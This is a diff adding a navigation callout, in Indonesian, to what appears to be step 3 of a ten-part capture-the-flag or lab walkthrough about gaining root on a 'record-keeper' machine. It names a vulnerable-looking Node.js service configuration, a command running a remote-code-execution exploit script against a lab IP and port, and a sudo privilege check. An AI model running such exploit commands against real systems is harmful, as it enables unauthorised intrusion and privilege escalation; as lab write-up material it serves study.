@@ -2,6 +2,12 @@
 
 [← Overview](16-record-keeper-root.md) · [Index](index.md)
 
+> **Langkah 3/10 — Analisis.** Service :3000 adalah Node.js 24.9.0 dengan zlib.createBrotliDecompress({chunkSize: 0x330}), Buffer.allocUnsafeSlow(0x330), satu Worker per koneksi, dan UVTHREADPOOLSIZE=1.
+>
+> **Titik penting:** python3 exploit/rce_worker.py --target 10.10.20.23 --port 3000 \ · sudo -n -l · 10.10.20.10
+>
+> **Berikutnya:** [Analisis](16-record-keeper-root-04-analisis-2.md)
+
 ## 2.1 Foothold Node2Shell (ringkas)
 
 Service `:3000` adalah Node.js 24.9.0 dengan
